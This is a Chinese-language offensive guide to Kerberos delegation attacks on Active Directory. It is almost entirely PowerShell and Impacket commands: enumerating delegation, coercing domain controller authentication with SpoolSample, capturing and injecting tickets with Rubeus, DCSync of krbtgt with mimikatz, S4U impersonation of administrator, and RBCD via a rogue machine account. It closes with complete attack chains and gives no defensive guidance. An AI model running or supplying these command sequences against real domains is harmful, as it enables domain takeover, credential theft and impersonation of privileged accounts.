# Kerberos委派攻击代码详解

## 1. 非约束委派枚举与利用

### 枚举非约束委派
```powershell
# 使用PowerView枚举
Import-Module .\PowerView.ps1

# 查找配置了非约束委派的计算机
Get-DomainComputer -Unconstrained

# 查找配置了非约束委派的用户
Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# 使用AD模块
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

### 使用Rubeus监控票据
```powershell
# 监控所有新票据
.\Rubeus.exe monitor /interval:5 /nowrap

# 监控特定用户的票据
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

# 转储当前票据
.\Rubeus.exe dump /nowrap
```

### 使用SpoolSample触发认证
```powershell
# 强制域控制器认证到我们控制的服务器
.\SpoolSample.exe DC01 FILES01

# 输出示例:
# TargetServer: \\DC01, CaptureServer: \\FILES01
# Attempted printer notification and received an invalid handle.
```

### 注入捕获的票据
```powershell
# 使用Rubeus注入票据
.\Rubeus.exe ptt /ticket:doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGxhgg...

# 验证票据
klist

# 使用票据进行DCSync
mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt
```

## 2. 约束委派枚举与利用

### 枚举约束委派
```powershell
# 查找配置了约束委派的用户
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# 查找配置了约束委派的计算机
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# 详细输出
Get-DomainUser -TrustedToAuth

# 输出示例:
# samaccountname           : IISSvc
# msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS, MSSQLSvc/cdc01.prod.corp1.com:1433}
# useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
```

### 使用Rubeus计算密码哈希
```powershell
# 从明文密码计算NTLM哈希
.\Rubeus.exe hash /password:lab

# 输出:
# [*] Input password             : lab
# [*]       rc4_hmac             : 2892D26CDF84D7A70E2EB3B9F05C425E
```

### 请求TGT
```powershell
# 使用密码哈希请求TGT
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# 输出Base64编码的TGT
# base64(ticket.kirbi): doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID...
```

### 执行S4U攻击
```powershell
# 使用TGT执行S4U攻击
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

# 或直接使用密码哈希
.\Rubeus.exe s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```

### 替代服务攻击
```powershell
# 请求不同服务的票据 (altservice)
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt

# 可以请求的服务:
# - CIFS (文件共享)
# - LDAP (目录服务)
# - HTTP (Web服务)
# - HOST (通用服务)
```

## 3. 基于资源的约束委派(RBCD)

### 检查机器账户配额
```powershell
# 检查是否可以创建计算机账户
Get-DomainObject -Identity "DC=prod,DC=corp1,DC=com" -Properties ms-DS-MachineAccountQuota

# 输出:
# ms-ds-machineaccountquota
# -------------------------
#                        10
```

### 创建计算机账户
```powershell
# 导入Powermad
Import-Module .\Powermad.ps1

# 创建计算机账户
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# 验证创建
Get-DomainComputer -Identity myComputer
```

### 配置RBCD
```powershell
# 获取新计算机的SID
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

# 创建安全描述符
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

# 转换为字节数组
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes, 0)

# 设置msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

### 验证RBCD配置
```powershell
# 读取配置
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select -Expand msds-allowedtoactonbehalfofotheridentity

# 解析安全描述符
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl

# 转换SID
$Descriptor.DiscretionaryAcl | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier.Value }
# 输出: PROD\myComputer$
```

### 执行RBCD攻击
```powershell
# 计算计算机账户密码哈希
.\Rubeus.exe hash /password:h4x
# rc4_hmac: AA6EAFB522589934A6E5CE92C6438221

# 执行S4U攻击
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt

# 验证票据
klist

# 访问目标
dir \\appsrv01.prod.corp1.com\c$
```

## 4. 使用Impacket进行委派攻击

### 约束委派攻击
```bash
# 获取服务票据
python getST.py -spn cifs/DC01.corp.com -impersonate Administrator corp.com/svc_sql:Password123!

# 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@DC01.corp.com
```

### RBCD攻击
```bash
# 添加计算机账户
python addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' corp.com/user:password

# 配置RBCD
python rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write corp.com/user:password

# 获取票据
python getST.py -spn cifs/TARGET.corp.com -impersonate Administrator corp.com/'FAKE01$':Password123!

# 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@TARGET.corp.com
```

## 7. 完整攻击流程示例

### 非约束委派完整流程
```powershell
# 1. 枚举非约束委派
Get-DomainComputer -Unconstrained

# 2. 登录到配置了非约束委派的服务器
# (假设已获得FILES01的访问权限)

# 3. 启动Rubeus监控
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap

# 4. 触发打印机认证
.\SpoolSample.exe DC01 FILES01

# 5. 捕获TGT并注入
.\Rubeus.exe ptt /ticket:doIFXDCCBVig...

# 6. 执行DCSync
mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt
```

### 约束委派完整流程
```powershell
# 1. 枚举约束委派
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto

# 2. 获取服务账户凭证
# (假设已获得IISSvc的密码或哈希)

# 3. 计算哈希
.\Rubeus.exe hash /password:lab

# 4. 执行S4U攻击
.\Rubeus.exe s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

# 5. 验证访问
# 使用SQL客户端连接验证
```

### RBCD完整流程
```powershell
# 1. 发现对计算机的写权限
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll"
}

# 2. 创建计算机账户
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 3. 配置RBCD
$sid = Get-DomainComputer -Identity FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes, 0)
Get-DomainComputer -Identity TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDbytes}

# 4. 执行攻击
.\Rubeus.exe hash /password:Password123!
.\Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:CIFS/TARGET.corp.com /ptt

# 5. 访问目标
dir \\TARGET.corp.com\c$
```
